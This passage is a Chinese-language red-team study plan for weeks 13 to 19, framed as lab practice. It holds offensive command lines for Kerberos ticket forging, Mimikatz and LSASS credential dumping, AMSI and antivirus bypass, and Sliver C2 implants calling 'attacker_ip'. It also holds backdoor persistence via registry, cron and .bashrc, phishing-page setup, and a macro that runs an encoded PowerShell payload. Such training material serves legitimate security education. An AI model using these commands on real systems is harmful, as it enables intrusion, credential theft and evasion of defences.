+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+第三阶段: 进阶提升期 (第13-20周) 具体计划
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+────────────────────────────────────────────────────────────────
+【第13周: 内网渗透基础与AD域】
+────────────────────────────────────────────────────────────────
+
+周一: 内网渗透概述与AD域基础
+  第1小时: 理论
+    - 学习: 内网渗透的基本流程和特点
+    - 学习: Active Directory 域服务基础概念
+      - 域控制器 (Domain Controller, DC)
+      - 域成员服务器和工作站
+      - 组织单位 (OU)
+      - 组策略 (GPO)
+    - 学习: AD域中的认证协议 (NTLM, Kerberos)
+    - 理解: 域内权限模型 (域管理员 vs 本地管理员)
+  第2小时: 实践
+    - 搭建AD域实验环境 (Windows Server + Windows 10):
+      1. 安装Windows Server 2019/2022 评估版
+      2. 配置为域控制器 (安装AD DS角色)
+      3. 创建域用户和组
+      4. 将Windows 10加入域
+    - 了解域内基本命令:
+      net user /domain
+      net group /domain
+      net group "Domain Admins" /domain
+  第3小时: 复盘
+    - 画出AD域架构图
+    - 整理AD域核心概念术语表
+    - 总结NTLM vs Kerberos认证区别
+
+周二: Kerberos认证深入
+  第1小时: 理论
+    - 学习: Kerberos认证流程 (AS-REQ, AS-REP, TGS-REQ, TGS-REP, AP-REQ)
+    - 学习: Kerberos核心组件 (KDC, AS, TGS, TGT, ST)
+    - 学习: SPN (Service Principal Name) 概念
+    - 了解: Kerberos常见攻击类型:
+      - Kerberoasting
+      - AS-REP Roasting
+      - Golden Ticket
+      - Silver Ticket
+      - Pass-the-Ticket
+  第2小时: 实践
+    - 在实验环境中观察Kerberos流量
+    - 使用Wireshark抓取Kerberos包并分析
+    - 使用klist查看当前Kerberos票据
+    - 设置SPN:
+      setspn -A HTTP/webserver.domain.local domain\user
+    - 了解Kerberos错误代码含义
+  第3小时: 复盘
+    - 画出Kerberos认证流程图
+    - 整理Kerberos票据类型
+    - 总结Kerberos攻击面
+
+周三: AD域信息收集
+  第1小时: 理论
+    - 学习: 域环境信息收集工具和方法
+    - 学习: LDAP查询基础
+    - 学习: BloodHound 原理和使用
+    - 学习: Powerview / SharpView
+    - 理解: 攻击路径分析 (Attack Path)
+  第2小时: 实践
+    - 在AD实验环境中进行信息收集:
+      1. 使用net commands收集域信息
+      2. 使用PowerShell Active Directory模块
+      3. 安装并使用BloodHound:
+         - 安装Neo4j数据库
+         - 运行SharpHound采集器
+         - 导入数据到BloodHound
+         - 分析: "Find Shortest Path to Domain Admins"
+      4. 理解BloodHound中的节点和边
+      5. 标记高风险路径
+  第3小时: 复盘
+    - 整理域信息收集检查清单
+    - 总结BloodHound使用手册
+    - 记录域内信息收集的敏感操作
+
+周四: 横向移动基础
+  第1小时: 理论
+    - 学习: 横向移动概念和目标
+    - 学习: 常见横向移动技术:
+      - PSExec (SMB)
+      - WMI
+      - WinRM / PowerShell Remoting
+      - RDP
+      - SMB共享
+    - 理解: 横向移动的凭证需求
+    - 了解: Pass-the-Hash (PTH) 原理
+  第2小时: 实践
+    - 在AD环境中练习:
+      1. 使用PSExec进行远程执行:
+         psexec \\target -u user -p pass cmd
+      2. 使用WMI执行命令:
+         wmic /node:target /user:user /password:pass process call create "cmd.exe"
+      3. 使用PowerShell Remoting:
+         Enter-PSSession -ComputerName target
+      4. 使用WinRS执行命令
+      5. 使用Impacket工具:
+         psexec.py domain/user:password@target
+         wmiexec.py domain/user:password@target
+         smbexec.py domain/user:password@target
+  第3小时: 复盘
+    - 整理横向移动技术对照表
+    - 总结各技术的日志痕迹
+    - 记录Impacket工具集
+
+周五: 域渗透实战准备
+  第1小时: 理论
+    - 学习: 域渗透的完整攻击链
+    - 了解: 域环境常见漏洞 (Zerologon, PrintNightmare, noPac等)
+    - 复习: 域渗透工具集 (Impacket, PowerSploit, Mimikatz)
+  第2小时: 实践
+    - 完成AD实验环境搭建和验证
+    - 验证域内各机器的网络连通性
+    - 创建快照 (重要!)
+    - 确认ArchStrike攻击机与AD域网络的连通性
+    - 部署BloodHound并确认数据采集正常
+    - 准备Impacket工具环境
+  第3小时: 复盘
+    - 画出AD实验环境拓扑图
+    - 整理域渗透工具集清单
+    - 制定下周域渗透实战计划
+
+周六 (复习日):
+  - 复习AD域核心概念
+  - 确保AD实验环境完全就绪
+  - 书写AD域渗透方法论文档
+  - 进行BloodHound攻击路径分析练习
+
+────────────────────────────────────────────────────────────────
+【第14周: 域渗透实战】
+────────────────────────────────────────────────────────────────
+
+周一: Kerberoasting与AS-REP Roasting
+  第1小时: 理论
+    - 学习: Kerberoasting原理 (请求ST并离线破解)
+    - 学习: AS-REP Roasting原理 (无需预认证的账户)
+    - 学习: 针对服务账户的攻击
+  第2小时: 实践
+    - 在AD环境中进行Kerberoasting:
+      1. 使用Impacket的GetUserSPNs:
+         GetUserSPNs.py domain.local/user:password -request
+      2. 使用Rubeus.exe:
+         Rubeus.exe kerberoast
+      3. 使用hashcat破解获取的TGS票据:
+         hashcat -m 13100 hash.txt wordlist.txt
+      4. 尝试使用破解的密码访问其他服务
+
+    - 进行AS-REP Roasting:
+      1. 使用Impacket的GetNPUsers:
+         GetNPUsers.py domain.local/ -usersfile users.txt -request
+      2. 使用hashcat破解AS-REP响应:
+         hashcat -m 18200 hash.txt wordlist.txt
+  第3小时: 复盘
+    - 整理Kerberoasting完整流程
+    - 记录AS-REP Roasting条件
+    - 总结此次获取的凭证
+
+周二: Pass-the-Hash与凭证窃取
+  第1小时: 理论
+    - 学习: NTLM Hash类型 (LM, NTLM, NTLMv2, Net-NTLMv2)
+    - 学习: Pass-the-Hash (PTH) 原理
+    - 学习: Pass-the-Ticket (PTT) 原理
+    - 学习: Mimikatz功能概述
+    - 学习: LSASS进程保护机制和绕过
+  第2小时: 实践
+    - 提取本地凭证:
+      1. 使用Mimikatz:
+         privilege::debug
+         sekurlsa::logonpasswords
+         lsadump::sam
+         lsadump::secrets
+      2. 从SAM和SYSTEM文件提取:
+         reg save hklm\sam c:\sam
+         reg save hklm\system c:\system
+         -> secretsdump.py -sam sam -system system LOCAL
+      3. 使用procdump转储LSASS
+      4. 使用mimikatz加载转储文件
+
+    - 执行PTH攻击:
+      psexec.py -hashes :ntlm_hash domain/admin@target
+      wmiexec.py -hashes :ntlm_hash domain/admin@target
+  第3小时: 复盘
+    - 整理Mimikatz核心命令
+    - 总结凭证获取和保护机制
+    - 记录PTH攻击要点
+
+周三: 票据攻击 — Golden Ticket与Silver Ticket
+  第1小时: 理论
+    - 学习: Golden Ticket原理 (伪造TGT)
+    - 学习: Silver Ticket原理 (伪造ST)
+    - 学习: Diamond Ticket原理
+    - 学习: 所需条件和权限 (KRBTGT Hash)
+    - 理解: 票据攻击与PTH的区别
+  第2小时: 实践
+    - 获取KRBTGT哈希 (需要域管理员权限):
+      secretsdump.py domain/domain_admin:password@dc_ip
+
+    - 制作Golden Ticket:
+      ticketer.py -domain-sid S-1-5-21-xxx -domain domain.local -aesKey aes256_key administrator
+      或使用Mimikatz:
+      kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:hash /user:administrator /id:500
+
+    - 制作Silver Ticket (针对特定服务):
+      ticketer.py -domain-sid S-1-5-21-xxx -domain domain.local -spn cifs/dc.domain.local -aesKey aes_key administrator
+
+    - 注入票据并访问目标:
+      export KRB5CCNAME=ticket.ccache
+      psexec.py -k -no-pass domain/administrator@dc
+  第3小时: 复盘
+    - 整理票据攻击对比表
+    - 总结Golden vs Silver Ticket
+    - 记录票据攻击的检测方法
+
+周四: 域提权 — 从普通用户到域管理员
+  第1小时: 理论
+    - 学习: 域提权的常见路径
+    - 学习: ACL滥用攻击
+    - 学习: 约束委派攻击 (Constrained Delegation)
+    - 学习: 非约束委派攻击 (Unconstrained Delegation)
+    - 学习: DCSync攻击
+    - 了解: 域控漏洞利用 (Zerologon CVE-2020-1472)
+  第2小时: 实践
+    - 使用BloodHound找出到域管理员的最短路径
+    - 如有ACL滥用路径, 使用PowerView/SharpView利用
+    - DCSync攻击:
+      secretsdump.py domain/user:password@dc -just-dc-user krbtgt
+    - 如果环境允许, 尝试Zerologon漏洞利用 (注意: 可能导致域控蓝屏)
+    - 尝试利用WriteDACL权限添加用户到Domain Admins
+  第3小时: 复盘
+    - 整理域提权路径图
+    - 总结各攻击的权限要求
+    - 记录DCSync的检测和防御
+
+周五: 域渗透综合实战
+  第1小时: 理论
+    - 复习两周的域渗透技术
+    - 设计攻击场景: 从普通域用户到域管理员
+  第2小时: 实践
+    完整域渗透链:
+    1. 初始立足点: 获得一个普通域用户凭证
+    2. 域信息收集: BloodHound采集+分析
+    3. 横向移动: PTH/PTT到第二台机器
+    4. 凭证窃取: 从第二台机器提取更高权限凭证
+    5. 提权路径: 利用ACL滥用或委派攻击
+    6. 目标达成: 获取域管理员权限
+    7. DCSync: 导出所有域凭证
+    8. 持久化: (了解即可) Golden Ticket
+  第3小时: 复盘
+    - 记录完整攻击链的每一步
+    - 输出域渗透报告
+    - 总结域渗透关键成功因素
+
+周六 (复习日):
+  - 复现本周所有攻击技术
+  - 整理域渗透完整方法论文档
+  - 在BloodHound中分析不同的攻击路径
+  - 尝试新的攻击链路径
+
+────────────────────────────────────────────────────────────────
+【第15周: 免杀与防御绕过技术】
+────────────────────────────────────────────────────────────────
+
+周一: 杀软检测原理
+  第1小时: 理论
+    - 学习: 杀软/EDR工作方式:
+      - 基于签名 (Signature-based)
+      - 启发式检测 (Heuristic)
+      - 行为检测 (Behavioral)
+      - 机器学习检测
+    - 学习: 免杀的概念和必要性
+    - 学习: VirusTotal的作用和使用注意事项
+    - 了解: Windows Defender, Kaspersky, 360等差异
+    - 理解: 静态检测 vs 动态检测 vs 内存检测
+  第2小时: 实践
+    - 用msfvenom生成一个裸Payload, 在VirusTotal上测试检出率
+    - 理解为什么裸Payload被大量标记
+    - 在自己的Windows实验机上测试Windows Defender
+    - 使用Process Monitor观察Payload的执行行为
+    - 了解AMSI (Antimalware Scan Interface) 的作用
+    - 测试一个已知的恶意样本 (在隔离环境中)
+  第3小时: 复盘
+    - 整理杀软检测技术分类
+    - 总结免杀的对抗维度
+    - 记录静态和动态检测的区别
+
+周二: Payload编码与混淆
+  第1小时: 理论
+    - 学习: MSF编码器原理 (shikata_ga_nai等)
+    - 学习: Shellcode混淆技术
+    - 学习: 变量/函数/类名混淆
+    - 学习: 字符串加密和动态解密
+    - 学习: 控制流混淆 (Control Flow Flattening)
+  第2小时: 实践
+    - 使用msfvenom编码器多次编码:
+      msfvenom -p windows/x64/shell_reverse_tcp ... -e x64/xor -i 5
+    - 对比不同编码次数的检出率
+    - 使用Veil-Evasion生成免杀Payload (如果工具可用)
+    - 使用Shellcode Runner技术:
+      - 编写C# Shellcode Runner
+      - 使用P/invoke加载shellcode
+    - 使用PowerShell混淆技术:
+      - Invoke-Obfuscation
+      - 字符串拼接和反转
+  第3小时: 复盘
+    - 整理免杀编码技术清单
+    - 总结多次编码的效果
+    - 记录Shellcode Runner模板
+
+周三: 进程注入与内存执行
+  第1小时: 理论
+    - 学习: 进程注入原理
+    - 学习: 常见注入技术:
+      - CreateRemoteThread
+      - 进程镂空 (Process Hollowing)
+      - 反射型DLL注入 (Reflective DLL Injection)
+      - APC注入
+      - Atom Bombing
+    - 学习: Shellcode内存执行技术
+    - 理解: 为什么内存执行更隐蔽
+  第2小时: 实践
+    - 编写简单的CreateRemoteThread注入代码
+    - 使用早鸟注入 (Early Bird APC Injection) 技术
+    - 尝试进程镂空 (Process Hollowing):
+      创建挂起进程 -> 替换内存 -> 恢复执行
+    - 了解Syscall直接调用技术
+    - 使用Donut将.NET程序转为Shellcode
+    - 练习: 生成C# Shellcode Runner + 注入到合法进程
+  第3小时: 复盘
+    - 整理进程注入技术对比表
+    - 总结各注入技术的隐蔽性
+    - 记录注入检测的EDR规则
+
+周四: AMSI绕过与PowerShell免杀
+  第1小时: 理论
+    - 学习: AMSI架构和工作原理
+    - 学习: AMSI绕过技术分类:
+      - AMSI初始化失败
+      - 修补AMSI函数
+      - 降级PowerShell版本
+      - 使用.NET反射绕过
+    - 学习: PowerShell日志与Script Block Logging
+    - 学习: Constrained Language Mode绕过
+  第2小时: 实践
+    - AMSI绕过练习:
+      1. 经典AMSI Bypass: [Ref].Assembly.GetType(...)
+      2. 修补AmsiScanBuffer
+      3. 强制设置为假的AMSI会话
+      4. 使用内存补丁
+    - PowerShell免杀练习:
+      1. 使用Invoke-Obfuscation混淆脚本
+      2. 下载Cradle混淆
+      3. Base64编码 + GZip压缩
+      4. 字符串替换和拼接
+    - 测试绕过前后的Defender检测差异
+  第3小时: 复盘
+    - 整理AMSI绕过技术清单
+    - 总结PowerShell安全防御
+    - 记录免杀效果的对比
+
+周五: 免杀综合实践
+  第1小时: 理论
+    - 复习本周免杀技术
+    - 理解: 免杀是多层对抗, 不是单一技术
+    - 了解: 商业C2的免杀能力
+  第2小时: 实践
+    综合免杀挑战:
+    1. 生成一个高免杀的Windows Reverse Shell Payload
+    2. 确保能在Windows Defender下运行
+    3. 尝试绕过行为检测 (使用合法的进程名, 正常的网络流量模式)
+    4. 对Payload进行多重处理:
+       - Shellcode加密
+       - 反沙箱机制
+       - 进程注入到合法程序
+       - 代码签名伪造
+    5. 在Windows沙箱环境中测试 (工具: any.run, app.any.run)
+  第3小时: 复盘
+    - 记录免杀成品的检出率
+    - 总结免杀开发流程
+    - 更新免杀技术笔记
+
+周六 (复习日):
+  - 复现本周所有免杀技术
+  - 整理免杀技术完整手册
+  - 建立自己的免杀Payload库
+  - 练习: 在15分钟内生成一个可用的免杀Payload
+
+────────────────────────────────────────────────────────────────
+【第16周: C2框架与红队基础设施】
+────────────────────────────────────────────────────────────────
+
+周一: C2框架基础
+  第1小时: 理论
+    - 学习: C2 (Command & Control) 概念和架构
+    - 学习: C2通信模型:
+      - Beacon模式 (callback间隔)
+      - P2P模式
+      - 通过代理转发
+    - 学习: C2通信协议 (HTTP/S, DNS, SMB, TCP)
+    - 学习: C2流量伪装技术
+    - 了解: 常见的开源C2框架 (Cobalt Strike, Sliver, Havoc, Mythic, Merlin)
+    - 了解: C2检测方法
+  第2小时: 实践
+    - 安装并配置Sliver C2框架:
+      git clone https://github.com/BishopFox/sliver
+      # 按文档编译安装
+    - 配置Sliver监听器
+    - 生成第一个Implants:
+      generate beacon --mtls attacker_ip:8888
+      generate --http attacker_domain.com
+    - 启动监听器, 在测试靶机上运行Implant
+    - 验证C2通信成功
+    - 尝试Sliver基本命令: sessions, use, info, getprivs
+  第3小时: 复盘
+    - 整理C2框架对比表
+    - 总结Beacon与Implant的区别
+    - 记录Sliver基本操作
+
+周二: Sliver深入使用
+  第1小时: 理论
+    - 学习: Sliver的高级功能
+    - 学习: Pivoting (端口转发, SOCKS代理)
+    - 学习: Sliver的扩展 (Extension and BOF)
+    - 学习: 多人协作模式
+    - 了解: Sliver vs Cobalt Strike功能对比
+  第2小时: 实践
+    在实验环境中使用Sliver:
+    1. 多会话管理:
+       sessions -l, sessions -i, sessions -k
+    2. 后渗透操作:
+       execute, shell, download, upload
+       screenshot, ps, migrate
+       execute-assembly (运行.NET程序集)
+    3. Pivoting操作:
+       端口转发: portfwd add -r target_ip:80 -b 0.0.0.0:8080
+       SOCKS代理: socks5 start
+    4. 使用扩展功能
+    5. 生成多平台的Implant (Windows, Linux, macOS)
+    6. 配置C2 Profile进行流量伪装
+  第3小时: 复盘
+    - 整理Sliver命令速查表
+    - 总结Pivoting应用场景
+    - 记录Sliver配置文件
+
+周三: 红队基础设施设计
+  第1小时: 理论
+    - 学习: 红队基础设施架构设计
+    - 学习: 重定向器 (Redirector) 概念和作用
+    - 学习: 域名前置 (Domain Fronting)
+    - 学习: CDN隐藏C2
+    - 学习: DNS C2原理
+    - 了解: 基础设施的OpSec考虑
+    - 了解: 隐蔽信道技术
+  第2小时: 实践
+    - 搭建重定向器:
+      1. 配置一台云服务器作为重定向器
+      2. 使用Apache/Nginx作为反向代理
+      3. 配置HTTPS证书
+      4. 将C2流量通过重定向器转发
+    - 了解CDN隐藏C2的配置方法
+    - 设置Docker化的C2基础设施
+    - 使用LetsEncrypt配置免费HTTPS证书
+    - 测试完整的C2通信链路: Implant -> Redirector -> C2 Server
+  第3小时: 复盘
+    - 画出红队基础设施架构图
+    - 总结重定向器的配置要点
+    - 记录基础设施安全注意事项
+
+周四: OpSec与流量隐匿
+  第1小时: 理论
+    - 学习: OpSec (Operational Security) 的基本概念
+    - 学习: 蓝队检测C2的常见手段
+    - 学习: JA3/JA3S指纹
+    - 学习: C2流量特征和伪装技术
+    - 学习: Sleep和Jitter的重要性
+    - 学习: 日志清理和痕迹清除
+    - 理解: 不同C2协议的隐蔽性对比
+  第2小时: 实践
+    - 分析自己C2流量的特征:
+      1. Wireshark抓包分析C2流量
+      2. 检查HTTP头是否像正常浏览器
+      3. 检查证书是否可信
+    - 修改Sliver的C2 Profile:
+      - 使用常见的User-Agent
+      - 模仿正常的Web流量模式
+      - 设置合理的Sleep和Jitter
+    - 测试修改后的流量是否更像正常流量
+    - 了解工具: ScareCrow (Payload加载器)
+    - 练习Sleep变化: 工作时间活动, 休息时间静默
+  第3小时: 复盘
+    - 整理OpSec检查清单
+    - 总结流量伪装技术
+    - 记录蓝队检测指标
+
+周五: C2与基础设施综合实践
+  第1小时: 理论
+    - 复习本周C2和基础设施内容
+    - 设计一个完整的红队基础设施方案
+  第2小时: 实践
+    搭建完整的红队C2环境:
+    1. C2服务器 (内网, 不与目标直接接触)
+    2. 重定向器 (公网VPS, 与目标交互)
+    3. HTTPS Beacon配置
+    4. 流量伪装Profile
+    5. 测试完整通信链路
+    6. 生成多个Implant备用
+    7. 配置自动化部署脚本
+  第3小时: 复盘
+    - 记录基础设施的完整配置
+    - 整理C2操作手册
+    - 输出红队基础设施设计方案
+
+周六 (复习日):
+  - 重新搭建一遍完整的C2基础设施
+  - 编写Sliver自动化操作脚本
+  - 整理C2流量分析笔记
+  - 练习: 使用Sliver完成一个完整的渗透操作
+────────────────────────────────────────────────────────────────
+【第17周: 后渗透与权限维持】
+────────────────────────────────────────────────────────────────
+
+周一: Windows后渗透信息收集
+  第1小时: 理论
+    - 学习: 后渗透阶段的信息收集目标
+    - 学习: Windows关键信息收集点:
+      用户和组, 进程, 服务, 计划任务, 网络配置, 环境变量
+    - 学习: 凭证收集点:
+      LSASS, SAM, 浏览器密码, RDP凭据, Wi-Fi密码
+    - 学习: 域信息收集 (结合第13-14周)
+    - 了解: Windows事件日志和取证痕迹
+  第2小时: 实践
+    获得一个Windows Shell后进行:
+    1. 系统信息: systeminfo, hostname, ver
+    2. 用户信息: whoami /all, net user, net localgroup, net group /domain
+    3. 进程信息: tasklist /svc, tasklist /v
+    4. 网络信息: ipconfig /all, netstat -ano, route print, arp -a
+    5. 防火墙: netsh advfirewall show allprofiles
+    6. 补丁信息: wmic qfe list, systeminfo | findstr /i "KB"
+    7. 运行WinPEAS进行全面自动化收集
+     8. 将收集结果导出到攻击机(ArchStrike)进行分析
+  第3小时: 复盘
+    - 整理Windows后渗透信息收集检查清单
+    - 总结WinPEAS输出关键点
+    - 记录信息收集的隐蔽性考虑
+
+周二: Windows凭证窃取
+  第1小时: 理论
+    - 学习: Windows凭证存储位置:
+      - SAM数据库 (本地账户)
+      - LSASS进程 (登录会话)
+      - Credential Manager (Windows保管库)
+      - DPAPI (数据保护API)
+      - NTDS.dit (域控凭证数据库)
+    - 学习: 凭证窃取技术:
+      - Mimikatz (sekurlsa, lsadump, vault)
+      - ProcDump + 离线提取
+      - 注册表导出 (SAM, SYSTEM, SECURITY)
+      - Kerberos票据导出
+  第2小时: 实践
+    - 在有权限的Windows靶机上:
+    1. 使用Mimikatz:
+       privilege::debug
+       sekurlsa::logonpasswords (提取明文/哈希)
+       lsadump::sam (本地SAM)
+       lsadump::lsa (LSA secrets)
+       vault::list (凭据管理器)
+       token::elevate (提权到SYSTEM)
+    2. 使用ProcDump:
+       procdump.exe -accepteula -ma lsass.exe lsass.dmp
+       -> mimikatz加载: sekurlsa::minidump lsass.dmp / sekurlsa::logonpasswords
+    3. 导出SAM和SYSTEM:
+       reg save hklm\sam sam.hive
+       reg save hklm\system system.hive
+       -> secretsdump.py -sam sam.hive -system system.hive LOCAL
+    4. 导出浏览器保存的密码
+  第3小时: 复盘
+    - 整理Mimikatz使用手册
+    - 总结凭证窃取技术对比
+    - 记录窃取痕迹和防御检测
+
+周三: Linux后渗透与凭证窃取
+  第1小时: 理论
+    - 学习: Linux后渗透信息收集重点
+    - 学习: Linux凭证存储位置:
+      - /etc/shadow, /etc/passwd
+      - SSH密钥 (~/.ssh/)
+      - 历史命令 (~/.bash_history, ~/.zsh_history)
+      - 配置文件中的密码
+      - 用户crontab
+    - 学习: Linux后渗透自动化工具 (LinPEAS, pspy)
+  第2小时: 实践
+    在Linux靶机上进行后渗透:
+    1. 自动化收集: LinPEAS
+    2. 手动收集:
+       cat /etc/passwd /etc/shadow
+       ls -la ~/.ssh/
+       cat ~/.bash_history
+       find / -type f -name "*.conf" 2>/dev/null | xargs grep -i "password"
+       env (查看环境变量)
+       ps aux (查看运行的进程)
+       netstat -tlnp (查看监听端口)
+       cat /etc/crontab; ls -la /etc/cron.*
+    3. 使用pspy监控进程 (发现cron等定时任务)
+    4. 查找可写的敏感文件:
+       find / -writable -type f 2>/dev/null | grep -v /proc
+    5. 查找SUID文件
+  第3小时: 复盘
+    - 整理Linux后渗透检查清单
+    - 总结LinPEAS输出分析
+    - 记录Linux凭证窃取技巧
+
+周四: 持久化技术
+  第1小时: 理论
+    - 学习: 持久化 (Persistence) 的概念和目标
+    - 学习: Windows持久化技术:
+      - 注册表Run键
+      - 计划任务
+      - 服务创建
+      - WMI事件订阅
+      - DLL劫持
+      - 快捷方式(LNK)劫持
+      - 后门账户
+    - 学习: Linux持久化技术:
+      - Cron任务
+      - SSH密钥
+      - .bashrc / .profile
+      - Systemd服务
+      - MOTD (Message of the Day)
+    - 学习: 持久化的隐蔽性和恢复能力
+  第2小时: 实践
+    Windows持久化练习:
+    1. 注册表Run键:
+       reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\backdoor.exe"
+    2. 计划任务:
+       schtasks /create /tn "SystemUpdate" /tr "backdoor.exe" /sc daily /st 09:00
+    3. 服务创建:
+       sc create "SysHealth" binpath= "C:\backdoor.exe" start= auto
+
+    Linux持久化练习:
+    1. Cron任务:
+       echo "* * * * * /tmp/backdoor.sh" | crontab -
+    2. SSH密钥:
+       echo "公钥" >> ~/.ssh/authorized_keys
+    3. .bashrc后门:
+       echo "/tmp/backdoor.sh &" >> ~/.bashrc
+    4. Systemd服务:
+       创建/etc/systemd/system/backdoor.service
+  第3小时: 复盘
+    - 整理持久化技术清单
+    - 总结各技术的检测难度
+    - 记录持久化的清理和应急响应视角
+
+周五: 横向移动深入
+  第1小时: 理论
+    - 回顾: 第14周学习的横向移动技术
+    - 学习: 更多横向移动技术:
+      - DCOM (Distributed COM)
+      - MSBuild
+      - CMSTP
+      - Remote Registry
+    - 学习: 横向移动工具链 (CrackMapExec, SharpHound)
+  第2小时: 实践
+    - 使用CrackMapExec进行横向移动:
+      crackmapexec smb 192.168.1.0/24 -u user -p pass --shares
+      crackmapexec smb 192.168.1.0/24 -u user -p pass -x "whoami"
+      crackmapexec smb 192.168.1.0/24 -u user -H hash -x "whoami"
+      crackmapexec winrm 192.168.1.0/24 -u user -p pass
+
+    - 使用Impacket工具集横向移动:
+      atexec.py
+      dcomexec.py
+
+    - 使用BloodHound规划横向移动路径
+
+    - 在内网中进行SMB共享发现和利用
+    - 从一台机器跳板到另一台机器 (使用ProxyChains或Socks)
+  第3小时: 复盘
+    - 整理CrackMapExec使用手册
+    - 总结横向移动工具矩阵
+    - 记录横向移动的行为特征和检测
+
+周六 (复习日):
+  - 复现本周所有后渗透和持久化技术
+  - 整理完整的后渗透操作手册
+  - 练习: 在一台机器上植入3种不同的持久化方式
+  - 尝试使用不同的横向移动技术跳转
+
+────────────────────────────────────────────────────────────────
+【第18周: 社会工程学】
+────────────────────────────────────────────────────────────────
+
+周一: 社会工程学基础
+  第1小时: 理论
+    - 学习: 社会工程学定义和分类
+    - 学习: 社会工程学的心理学原理:
+      - 权威性 (Authority)
+      - 稀缺性 (Scarcity)
+      - 社会认同 (Social Proof)
+      - 喜欢/相似性 (Liking)
+      - 互惠 (Reciprocity)
+      - 承诺一致性 (Commitment)
+    - 学习: 常见社工攻击类型:
+      - 钓鱼 (Phishing)
+      - 电话诈骗 (Vishing)
+      - 短信诈骗 (Smishing)
+      - 物理渗透 (Physical)
+      - 尾随 (Tailgating)
+      - 诱饵 (Baiting)
+    - 注意: 社会工程学应在授权范围内进行!
+  第2小时: 实践
+    - 分析真实钓鱼邮件案例, 总结特征
+    - 使用haveibeenpwned.com了解数据泄露的社工价值
+    - 练习: 编写一份钓鱼邮件草稿 (在沙箱环境中, 不实际发送)
+    - 了解Phishing Frenzy / GoPhish / Evilginx等工具
+    - 访问Social-Engineer.org学习信息
+  第3小时: 复盘
+    - 整理社会工程学攻击框架
+    - 总结社工攻击的心理触发点
+    - 记录社工攻击的法律和道德边界
+
+周二: 钓鱼邮件实践
+  第1小时: 理论
+    - 学习: 钓鱼邮件的构成要素:
+      - 发件人伪装
+      - 诱人的主题
+      - 可信的内容
+      - 恶意附件或链接
+    - 学习: 常见的钓鱼邮件类型:
+      - 凭证窃取钓鱼
+      - 恶意附件钓鱼
+      - CEO欺诈/BEC攻击
+      - 鱼叉式钓鱼 (Spear Phishing)
+    - 学习: 钓鱼邮件防御技术 (SPF, DKIM, DMARC)
+  第2小时: 实践
+    在隔离实验环境中:
+    1. 搭建GoPhish钓鱼平台
+    2. 创建钓鱼邮件模板:
+       - 模拟密码重置通知
+       - 模拟IT支持请求
+       - 模拟OA系统通知
+    3. 设计钓鱼网站 (克隆登录页面)
+    4. 配置SMTP发送设置 (使用测试邮件服务)
+    5. 创建Landing Page (收集凭证)
+    6. 运行模拟钓鱼活动 (仅对自己的测试邮箱)
+    7. 分析活动结果统计
+  第3小时: 复盘
+    - 整理GoPhish使用手册
+    - 总结钓鱼邮件的关键成功因素
+    - 记录钓鱼邮件的检测特征
+
+周三: 恶意文档制作
+  第1小时: 理论
+    - 学习: 恶意宏 (VBA Macro) 原理
+    - 学习: Office文档格式与OLE结构
+    - 学习: DDE攻击 (Dynamic Data Exchange)
+    - 学习: 公式注入 (Formula Injection / DDE in CSV)
+    - 学习: HTA (HTML Application) 攻击
+    - 了解: 宏保护警告和安全设置
+  第2小时: 实践
+    - 制作恶意Word宏:
+      1. 打开Word, 按Alt+F11进入VBA编辑器
+      2. 编写AutoOpen()宏:
+         Sub AutoOpen()
+           Shell("cmd.exe /c powershell -enc <base64_payload>")
+         End Sub
+      3. 保存为启用宏的文档 (.docm)
+    - 使用msfvenom生成PowerShell Payload
+    - 制作HTA文件:
+      msfvenom -p windows/shell_reverse_tcp ... -f hta-psh -o payload.hta
+    - 了解Ebowla / GreatSCT等工具
+    - 在测试环境中验证宏的执行
+  第3小时: 复盘
+    - 整理恶意文档制作技术
+    - 总结宏保护的绕过方法
+    - 记录VBA关键函数
+
+周四: 凭证钓鱼与中间人攻击
+  第1小时: 理论
+    - 学习: Evilginx框架原理 (反向代理, 会话劫持)
+    - 学习: 多因素认证(MFA)绕过技术
+    - 学习: 凭证钓鱼 vs 会话劫持的区别
+    - 学习: MITM攻击工具 (Bettercap, Responder)
+    - 了解: LLMNR/NBT-NS投毒攻击
+  第2小时: 实践
+    - 搭建Evilginx环境 (配置Phishlet)
+    - 模拟凭证钓鱼流程
+    - 在内网中使用Responder:
+      responder -I eth0 -wrf
+    - 分析Responder捕获的Net-NTLMv2哈希
+    - 使用hashcat破解捕获的哈希
+    - 在实验网络中进行LLMNR投毒
+    - 了解WPAD攻击
+  第3小时: 复盘
+    - 整理凭证钓鱼工具对比
+    - 总结MFA绕过技术的局限性
+    - 记录内网协议投毒攻击
+
+周五: 社会工程学综合实践
+  第1小时: 理论
+    - 复习本周社工技术
+    - 设计一个完整的社工攻击场景
+    - 学习: 如何报告社工测试结果
+  第2小时: 实践
+    在隔离环境中完成一个社工链:
+    1. OSINT信息收集 (目标公司员工信息)
+    2. 选定目标和攻击场景
+    3. 制作钓鱼邮件模板
+    4. 制作恶意附件/钓鱼链接
+    5. 搭建钓鱼网站 (克隆目标登录页)
+    6. 在GoPhish中配置完整活动
+    7. 模拟全流程 (仅对自己或授权测试)
+  第3小时: 复盘
+    - 输出社工攻击方案文档
+    - 总结社工测试的成败因素
+    - 记录社工测试后的建议报告
+
+周六 (复习日):
+  - 复现本周所有社工攻击技术
+  - 整理社会工程学工具集
+  - 练习: 30分钟内完成一个钓鱼邮件模板的设计
+  - 阅读一份真实的社工测试报告
+
+────────────────────────────────────────────────────────────────
+【第19周: 工具开发与自动化 (一)】
+────────────────────────────────────────────────────────────────
+
+周一: 渗透测试自动化脚本开发
+  第1小时: 理论
+    - 学习: 为什么需要自研工具
+    - 学习: 自动化脚本的设计模式
+    - 学习: 模块化和可配置化设计
+    - 学习: 错误处理和日志记录
+  第2小时: 实践
+    使用Python开发一个综合信息收集工具:
+    - 功能模块:
+      1. WHOIS查询
+      2. DNS枚举 (A, MX, NS, TXT, CNAME记录)
+      3. 子域名枚举
+      4. 端口扫描 (多线程)
+      5. HTTP头分析
+    - 使用argparse配置命令行参数
+    - 输出格式化结果 (支持JSON和表格)
+    - 添加进度条显示 (tqdm库)
+    - 实现并发处理提升速度
+  第3小时: 复盘
